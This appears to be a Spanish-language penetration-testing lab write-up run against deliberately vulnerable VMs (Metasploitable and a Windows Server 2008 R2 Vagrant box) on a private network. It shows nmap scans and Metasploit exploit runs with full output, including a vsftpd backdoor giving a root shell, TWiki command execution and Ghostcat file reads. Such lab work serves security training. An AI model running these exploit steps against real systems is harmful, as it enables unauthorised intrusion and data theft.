Ubuntu:
-Obtener información del sistema vulnerable
Con la herramienta nmap escaneamos la dirección del sistema vulnerable.

   $ nmap -sV -Pn 192.168.1.141
   Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 11:46 EDT
   Nmap scan report for 192.168.1.141
   Host is up (0.0084s latency).
   Not shown: 977 closed tcp ports (conn-refused)
   PORT     STATE SERVICE     VERSION
   21/tcp   open  ftp         vsftpd 2.3.4
   22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
   23/tcp   open  telnet      Linux telnetd
   25/tcp   open  smtp        Postfix smtpd
   53/tcp   open  domain      ISC BIND 9.4.2
   80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
   111/tcp  open  rpcbind     2 (RPC #100000)
   139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   512/tcp  open  exec        netkit-rsh rexecd
   513/tcp  open  login
   514/tcp  open  tcpwrapped
   1099/tcp open  java-rmi    GNU Classpath grmiregistry
   1524/tcp open  bindshell   Metasploitable root shell
   2049/tcp open  nfs         2-4 (RPC #100003)
   2121/tcp open  ftp         ProFTPD 1.3.1
   3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
   5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
   5900/tcp open  vnc         VNC (protocol 3.3)
   6000/tcp open  X11         (access denied)
   6667/tcp open  irc         UnrealIRCd
   8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
   8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
   Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds


-Explorar e identificar vulnerabilidades del sistema 
Con la heramienta metasploid framework indentificamos 2 vulnerabilidades: proftp y ssh.

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > search exploit/unix/webapp/twiki_historysae
95   exploit/unix/webapp/twiki_history                                  2005-09-14       excellent  Yes    TWiki History TWikiUsers rev Parameter Command Execution

msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Explotar las vulnerabilidades

En mi caso voy a explotar el puerto 80 mediante el modulo exploit/unix/webapp/twiki_history)
   exploit(unix/webapp/twiki_history) > 
   [+] Successfully sent exploit request
   [*] Started bind TCP handler against 192.168.1.141:4444
   [*] Command shell session 2 opened (192.168.1.138:46177 -> 192.168.1.141:4444) at 2023-10-10 12:11:14 -0400

vemos las sesiones activas:

   msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 

   Active sessions
   ===============
   
     Id  Name  Type                 Information           Connection
     --  ----  ----                 -----------           ----------
     3         meterpreter x86/lin  www-data @ metasploi  192.168.1.138:4433 -
               ux                   table.localdomain     > 192.168.1.141:4631
                                                          8 (192.168.1.141)

usamos el modulo post/multi/manage/shell_tometerpreter:

 msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
   [*] Starting interaction with 3...

   meterpreter > ifconfig

   Interface  1
   ============
   Name         : lo
   Hardware MAC : 00:00:00:00:00:00
   MTU          : 16436
   Flags        : UP,LOOPBACK
   IPv4 Address : 127.0.0.1
   IPv4 Netmask : 255.0.0.0
   IPv6 Address : ::1
   IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
   
   
   Interface  2
   ============
   Name         : eth0
   Hardware MAC : 08:00:27:b1:b5:c7
   MTU          : 1500
   Flags        : UP,BROADCAST,MULTICAST
   IPv4 Address : 192.168.1.141
   IPv4 Netmask : 255.255.255.0
   IPv6 Address : fe80::a00:27ff:feb1:b5c7
   IPv6 Netmask : ffff:ffff:ffff:ffff::

Ahora vamos a explotar el puerto 21 de ftp:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.1.141
rhosts => 192.168.1.141
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.1.141:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.141:21 - USER: 331 Please specify the password.
[+] 192.168.1.141:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.141:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.138:36243 -> 192.168.1.141:6200) at 2023-10-10 13:00:58 -0400

Ahora podemos tener a nuestra disposicion el sistema de ficheros del host vulnerable:
   pwd
   /
   ls -la
   total 89
   drwxr-xr-x  21 root root  4096 May 20  2012 .
   drwxr-xr-x  21 root root  4096 May 20  2012 ..
   drwxr-xr-x   2 root root  4096 May 13  2012 bin
   drwxr-xr-x   4 root root  1024 May 13  2012 boot
   lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
   drwxr-xr-x  14 root root 13540 Oct 10 11:43 dev
   drwxr-xr-x  94 root root  4096 Oct 10 11:43 etc
   drwxr-xr-x   6 root root  4096 Apr 16  2010 home
   drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
   lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
   drwxr-xr-x  13 root root  4096 May 13  2012 lib
   drwx------   2 root root 16384 Mar 16  2010 lost+found
   drwxr-xr-x   4 root root  4096 Mar 16  2010 media
   drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
   -rw-------   1 root root  5821 Oct 10 11:43 nohup.out
   drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
   dr-xr-xr-x 112 root root     0 Oct 10 11:43 proc
   drwxr-xr-x  13 root root  4096 Oct 10 11:43 root
   drwxr-xr-x   2 root root  4096 May 13  2012 sbin
   drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
   drwxr-xr-x  12 root root     0 Oct 10 11:43 sys
   drwxrwxrwt   4 root root  4096 Oct 10 12:28 tmp
   drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
   drwxr-xr-x  14 root root  4096 Mar 17  2010 var

   Usando Metasploit en Windows Server 2008

Accedemos al metasploit 


msfconsole

Analizamos Windows Server 2008 usando el siguiente comando con nmap

msf6 > nmap -v -A 192.168.1.86
[*] exec: nmap -v -A 192.168.1.86

Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 13:22 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating Ping Scan at 13:22
Scanning 192.168.1.86 [2 ports]
Completed Ping Scan at 13:22, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:22
Completed Parallel DNS resolution of 1 host. at 13:22, 0.08s elapsed
Initiating Connect Scan at 13:22
Scanning 192.168.1.86 [1000 ports]
Discovered open port 22/tcp on 192.168.1.86
Discovered open port 135/tcp on 192.168.1.86
Discovered open port 445/tcp on 192.168.1.86
Discovered open port 3306/tcp on 192.168.1.86
Discovered open port 139/tcp on 192.168.1.86
Discovered open port 3389/tcp on 192.168.1.86
Discovered open port 21/tcp on 192.168.1.86
Discovered open port 80/tcp on 192.168.1.86
Discovered open port 8080/tcp on 192.168.1.86
Discovered open port 7676/tcp on 192.168.1.86
Discovered open port 49152/tcp on 192.168.1.86
Discovered open port 9200/tcp on 192.168.1.86
Discovered open port 49155/tcp on 192.168.1.86
Discovered open port 8009/tcp on 192.168.1.86
Discovered open port 49154/tcp on 192.168.1.86
Discovered open port 49153/tcp on 192.168.1.86
Discovered open port 4848/tcp on 192.168.1.86
Discovered open port 8383/tcp on 192.168.1.86
Discovered open port 8181/tcp on 192.168.1.86
Completed Connect Scan at 13:22, 1.28s elapsed (1000 total ports)
Initiating Service scan at 13:22
Scanning 19 services on 192.168.1.86
Completed Service scan at 13:24, 103.67s elapsed (19 services on 1 host)
NSE: Script scanning 192.168.1.86.
Initiating NSE at 13:24
Completed NSE at 13:24, 23.68s elapsed
Initiating NSE at 13:24
Completed NSE at 13:24, 1.56s elapsed
Initiating NSE at 13:24
Completed NSE at 13:24, 0.01s elapsed
Nmap scan report for 192.168.1.86
Host is up (0.00055s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT  	STATE SERVICE          	VERSION
21/tcp	open  ftp              	Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
22/tcp	open  ssh              	OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:08:98:ca:3c:e8:c1:3c:ea:dd:09:1a:2e:89:a5:1f (RSA)
|_  521 7e:57:81:8e:f6:3c:1d:cf:eb:7d:ba:d1:12:31:b5:a8 (ECDSA)
80/tcp	open  http             	Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc            	Microsoft Windows RPC
139/tcp   open  netbios-ssn      	Microsoft Windows netbios-ssn
445/tcp   open  X5}6�U           	Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
3306/tcp  open  mysql            	MySQL 5.5.20-log
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=vagrant-2008R2
| Issuer: commonName=vagrant-2008R2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-10-06T11:02:46
| Not valid after:  2024-04-06T11:02:46
| MD5:   7ee9:924d:9f94:4578:1a23:b288:b2d9:f864
|_SHA-1: 2197:ddee:e0c0:0098:a5d7:0390:b822:b963:409e:29aa
| rdp-ntlm-info:
|   Target_Name: VAGRANT-2008R2
|   NetBIOS_Domain_Name: VAGRANT-2008R2
|   NetBIOS_Computer_Name: VAGRANT-2008R2
|   DNS_Domain_Name: vagrant-2008R2
|   DNS_Computer_Name: vagrant-2008R2
|   Product_Version: 6.1.7601
|_  System_Time: 2023-10-10T17:24:03+00:00
|_ssl-date: 2023-10-10T17:24:26+00:00; +2s from scanner time.
4848/tcp  open  ssl/http         	Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
|_http-title: Login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Issuer: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2013-05-15T05:33:38
| Not valid after:  2023-05-13T05:33:38
| MD5:   790d:fccf:9932:2bbe:7736:404a:14e1:2d91
|_SHA-1: 4a57:58f5:9279:e82f:2a91:3c83:ca65:8d69:6457:5a72
|_ssl-date: 2023-10-10T17:24:26+00:00; +2s from scanner time.
|_http-server-header: GlassFish Server Open Source Edition  4.0
|_http-favicon: Unknown favicon MD5: E54F2AD8F25242D591DFA5BF26061717
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13            	Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http             	Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
|_http-server-header: GlassFish Server Open Source Edition  4.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: GlassFish Server - Server Running
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
8181/tcp  open  ssl/http         	Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
|_http-title: GlassFish Server - Server Running
|_http-server-header: GlassFish Server Open Source Edition  4.0
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Issuer: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2013-05-15T05:33:38
| Not valid after:  2023-05-13T05:33:38
| MD5:   790d:fccf:9932:2bbe:7736:404a:14e1:2d91
|_SHA-1: 4a57:58f5:9279:e82f:2a91:3c83:ca65:8d69:6457:5a72
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_ssl-date: 2023-10-10T17:24:26+00:00; +2s from scanner time.
8383/tcp  open  http             	Apache httpd
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
9200/tcp  open  wap-wsp?
| fingerprint-strings:
|   FourOhFourRequest:
| 	HTTP/1.0 400 Bad Request
| 	Content-Type: text/plain; charset=UTF-8
| 	Content-Length: 80
| 	handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
|   GetRequest:
| 	HTTP/1.0 200 OK
| 	Content-Type: application/json; charset=UTF-8
| 	Content-Length: 310
| 	"status" : 200,
| 	"name" : "Ms. Marvel",
| 	"version" : {
| 	"number" : "1.1.1",
| 	"build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
| 	"build_timestamp" : "2014-04-16T14:27:12Z",
| 	"build_snapshot" : false,
| 	"lucene_version" : "4.7"
| 	"tagline" : "You Know, for Search"
|   HTTPOptions:
| 	HTTP/1.0 200 OK
| 	Content-Type: text/plain; charset=UTF-8
| 	Content-Length: 0
|   RTSPRequest, SIPOptions:
| 	HTTP/1.1 200 OK
| 	Content-Type: text/plain; charset=UTF-8
|_	Content-Length: 0
49152/tcp open  msrpc            	Microsoft Windows RPC
49153/tcp open  msrpc            	Microsoft Windows RPC
49154/tcp open  msrpc            	Microsoft Windows RPC
49155/tcp open  msrpc            	Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9200-TCP:V=7.94%I=7%D=10/10%Time=65258853%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,18D,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/j
SF:son;\x20charset=UTF-8\r\nContent-Length:\x20310\r\n\r\n{\r\n\x20\x20\"s
SF:tatus\"\x20:\x20200,\r\n\x20\x20\"name\"\x20:\x20\"Ms\.\x20Marvel\",\r\
SF:n\x20\x20\"version\"\x20:\x20{\r\n\x20\x20\x20\x20\"number\"\x20:\x20\"
SF:1\.1\.1\",\r\n\x20\x20\x20\x20\"build_hash\"\x20:\x20\"f1585f096d3f3985
SF:e73456debdc1a0745f512bbc\",\r\n\x20\x20\x20\x20\"build_timestamp\"\x20:
SF:\x20\"2014-04-16T14:27:12Z\",\r\n\x20\x20\x20\x20\"build_snapshot\"\x20
SF::\x20false,\r\n\x20\x20\x20\x20\"lucene_version\"\x20:\x20\"4\.7\"\r\n\
SF:x20\x20},\r\n\x20\x20\"tagline\"\x20:\x20\"You\x20Know,\x20for\x20Searc
SF:h\"\r\n}\n")%r(HTTPOptions,4F,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20
SF:charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,A9,
SF:"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=UTF-8\r\nContent-Length:\x2080\r\n\r\nNo\x20handler\x20found\x2
SF:0for\x20uri\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\x20and\x20meth
SF:od\x20\[GET\]")%r(SIPOptions,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type
SF::\x20text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h38m45s, median: 1s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: vagrant-2008R2
|   NetBIOS computer name: VAGRANT-2008R2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-10T10:24:03-07:00
| nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:d7:cc:d8 (Oracle VirtualBox virtual NIC)
| Names:
|   VAGRANT-2008R2<00>   Flags: <unique><active>
|   WORKGROUP<00>    	Flags: <group><active>
|_  VAGRANT-2008R2<20>   Flags: <unique><active>
| smb2-security-mode:
|   2:1:0:
|_	Message signing enabled but not required
| smb2-time:
|   date: 2023-10-10T17:24:02
|_  start_date: 2023-10-10T17:09:30

NSE: Script Post-scanning.
Initiating NSE at 13:24
Completed NSE at 13:24, 0.01s elapsed
Initiating NSE at 13:24
Completed NSE at 13:24, 0.01s elapsed
Initiating NSE at 13:24
Completed NSE at 13:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.16 seconds

BUSCAMOS EN EL PUERTO 21 LA VERSION

msf6 > search Microsoft ftpd

Matching Modules
================

   #  Name                                      	Disclosure Date  Rank	Check  Description
   -  ----                                      	---------------  ----	-----  -----------
   0  exploit/windows/ftp/ms09_053_ftpd_nlst    	2009-08-31   	great   No 	MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   1  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof  2010-12-21   	normal  No 	Microsoft IIS FTP Server Encoded Response Overflow Trigger


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof

USAMOS EL EXPLOIT 0

msf6 > use exploit/windows/ftp/ms09_053_ftpd_nlst
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

MOSTRAMOS LAS OPCIONES DEL EXPLOIT

msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > show options

Module options (exploit/windows/ftp/ms09_053_ftpd_nlst):

   Name 	Current Setting  	Required  Description
   ---- 	---------------  	--------  -----------
   FTPPASS  mozilla@example.com  no    	The password for the specified username
   FTPUSER  anonymous        	no    	The username to authenticate as
   RHOSTS                    	yes   	The target host(s), see https://docs.metasploit.com/docs/using-metasplo
                                       	it/basics/using-metasploit.html
   RPORT	21               	yes   	The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name  	Current Setting  Required  Description
   ----  	---------------  --------  -----------
   EXITFUNC  process      	yes   	Exit technique (Accepted: '', seh, thread, process, none)
   LHOST 	192.168.1.84 	yes   	The listen address (an interface may be specified)
   LPORT 	4444         	yes   	The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2000 SP4 English/Italian (IIS 5.0)



View the full module info with the info, or info -d command.

MODIFICAMOS EL RHOSTS

msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > set RHOSTS 192.168.1.86
RHOSTS => 192.168.1.86

EJECUTAMOS EL EXPLOIT

msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > exploit

[*] Started reverse TCP handler on 192.168.1.84:4444
[*] 192.168.1.86:21 - 530 Please login with USER and PASS.
[-] 192.168.1.86:21 - The root directory of the FTP server is not writeable
[*] Exploit completed, but no session was created.



PUERTO 80

msf6 exploit(windows/local/unquoted_service_path) > search Microsoft IIS

Matching Modules
================

   #   Name                                                                	Disclosure Date  Rank   	Check  Description
   -   ----                                                                	---------------  ----   	-----  -----------
   0   exploit/windows/isapi/ms00_094_pbserver                             	2000-12-04   	good   	Yes	MS00-094 Microsoft IIS Phone Book Service Overflow
   1   exploit/windows/iis/ms01_023_printer                                	2001-05-01   	good   	Yes	MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow
   2   exploit/windows/iis/ms01_026_dbldecode                              	2001-05-15   	excellent  Yes	MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
   3   exploit/windows/iis/ms01_033_idq                                    	2001-06-18   	good   	No 	MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
   4   exploit/windows/iis/ms02_018_htr                                    	2002-04-10   	good   	No 	MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
   5   exploit/windows/iis/ms02_065_msadc                                  	2002-11-02   	normal 	Yes	MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow
   6   exploit/windows/iis/ms03_007_ntdll_webdav                           	2003-05-30   	great  	Yes	MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   7   exploit/windows/isapi/ms03_022_nsiislog_post                        	2003-06-25   	good   	Yes	MS03-022 Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow
   8   exploit/windows/isapi/ms03_051_fp30reg_chunked                      	2003-11-11   	good   	Yes	MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow
   9   exploit/windows/ssl/ms04_011_pct                                    	2004-04-13   	average	No 	MS04-011 Microsoft Private Communications Transport Overflow
   10  exploit/windows/ftp/ms09_053_ftpd_nlst                              	2009-08-31   	great  	No 	MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   11  auxiliary/admin/http/iis_auth_bypass                                	2010-07-02   	normal 	No 	MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
   12  exploit/windows/iis/msadc                                           	1998-07-17   	excellent  Yes	MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   13  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                     	2010-09-14   	normal 	No 	Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service                                                         	 
   14  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                        	2010-12-21   	normal 	No 	Microsoft IIS FTP Server Encoded Response Overflow Trigger                                                       	 
   15  auxiliary/dos/windows/ftp/iis_list_exhaustion                       	2009-09-03   	normal 	No 	Microsoft IIS FTP Server LIST Stack Exhaustion                                                                   	 
   16  auxiliary/scanner/http/iis_internal_ip                                               	normal 	No 	Microsoft IIS HTTP Internal IP Disclosure                                                                        	 
   17  exploit/windows/isapi/rsa_webagent_redirect                         	2005-10-21   	good   	Yes	Microsoft IIS ISAPI RSA WebAgent Redirect Overflow                                                               	 
   18  exploit/windows/isapi/w3who_query                                   	2004-12-06   	good   	Yes	Microsoft IIS ISAPI w3who.dll Query String Overflow                                                              	 
   19  exploit/windows/iis/iis_webdav_upload_asp                           	2004-12-31   	excellent  No 	Microsoft IIS WebDAV Write Access Code Execution                                                                 	 
   20  exploit/windows/iis/iis_webdav_scstoragepathfromurl                 	2017-03-26   	manual 	Yes	Microsoft IIS WebDav ScStoragePathFromUrl Overflow                                                               	 
   21  auxiliary/scanner/http/iis_shortname_scanner                                         	normal 	Yes	Microsoft IIS shortname vulnerability scanner                                                                    	 
   22  auxiliary/scanner/http/owa_iis_internal_ip                          	2012-12-17   	normal 	No 	Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   23  exploit/windows/http/umbraco_upload_aspx                            	2012-06-28   	excellent  No 	Umbraco CMS Remote Command Execution
   24  auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166  2021-05-11   	normal 	No 	Windows IIS HTTP Protocol Stack DOS


Interact with a module by name or index. For example info 24, use 24 or use auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166        

                                                                         	 
USAMOS EL SIGUIENTE EXPLOIT

msf6 exploit(windows/iis/ms01_026_dbldecode) > use exploit/windows/iis/msadc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

MOSTRAMOS LAS OPCIONES

msf6 exploit(windows/iis/msadc) > show options

Module options (exploit/windows/iis/msadc):

   Name    	Current Setting	Required  Description
   ----    	---------------	--------  -----------
   DBHOST  	local          	yes   	The SQL Server host
   DBNAME  	master         	yes   	The SQL Server database
   DBPASSWORD                 	no    	The SQL Server password (default is blank)
   DBUID   	sa             	yes   	The SQL Server uid (default is sa)
   METHOD  	false          	yes   	If true, use VbBusObj instead of AdvancedDataFactory
   NAME    	false          	yes   	If true, attempt to obtain the MACHINE NAME
   PATH    	/msadc/msadcs.dll  yes   	The path to msadcs.dll
   Proxies                    	no    	A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     	yes   	The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                        	oit/basics/using-metasploit.html
   RPORT   	80             	yes   	The target port (TCP)
   SSL     	false          	no    	Negotiate SSL/TLS for outgoing connections
   SSLCert                    	no    	Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    	no    	The URI to use for this exploit (default is random)
   VHOST                      	no    	HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name 	Current Setting  Required  Description
   ---- 	---------------  --------  -----------
   SRVHOST  0.0.0.0      	yes   	The local host or network interface to listen on. This must be an address o
                                   	n the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080         	yes   	The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name  	Current Setting  Required  Description
   ----  	---------------  --------  -----------
   EXITFUNC  process      	yes   	Exit technique (Accepted: '', seh, thread, process, none)
   LHOST 	192.168.1.84 	yes   	The listen address (an interface may be specified)
   LPORT 	4444         	yes   	The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

MODIFICAMOS RHOSTS

msf6 exploit(windows/iis/msadc) > set RHOSTS 192.168.1.86
RHOSTS => 192.168.1.86


msf6 exploit(windows/iis/msadc) > exploit

[*] Started reverse TCP handler on 192.168.1.84:4444
[*] Searching for valid command execution point...
[*] Step 1: Trying raw driver to btcustmr.mdb
[*] Step 2: Trying to make our own DSN...
[*] Step 3: Trying to create a new table in our own DSN...
[*] Step 4: Trying to execute our command via our own DSN and table...
[*] Step 5: Trying to execute our command via known DSNs...
[*] Step 6: Trying known system .mdbs...
[*] Step 7: Trying known program file .mdbs...
[*] Step 8: Trying SQL xp_cmdshell method...
[*] Exploit completed, but no session was created.

BUSCAMOS APACHE JSERV PUERTO 8009

msf6 exploit(multi/http/apache_normalize_path_rce) > search Apache Jserv

Matching Modules
================

   #  Name                              	Disclosure Date  Rank	Check  Description
   -  ----                              	---------------  ----	-----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20   	normal  Yes	Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

USAMOS EL SIGUIENTE EXPLOIT

msf6 exploit(multi/http/apache_normalize_path_rce) > use auxiliary/admin/http/tomcat_ghostcat

MOSTRAMOS LAS OPCIONES 

msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name  	Current Setting   Required  Description
   ----  	---------------   --------  -----------
   AJP_PORT  8009          	no    	The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes   	File name
   RHOSTS                  	yes   	The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                     	/basics/using-metasploit.html
   RPORT 	8080          	yes   	The Apache Tomcat webserver port (TCP)
   SSL   	false         	yes   	SSL


View the full module info with the info, or info -d command.

MODIFICAMOS EL RHOSTS

msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 192.168.1.86
RHOSTS => 192.168.1.86




EJECUTAMOS EL EXPLOIT

msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 192.168.1.86
Status Code: OK
Accept-Ranges: bytes
ETag: W/"1262-1458358374000"
Last-Modified: Sat, 19 Mar 2016 03:32:54 GMT
Content-Type: application/xml
Content-Length: 1262
<?xml version="1.0" encoding="ISO-8859-1"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

  	http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
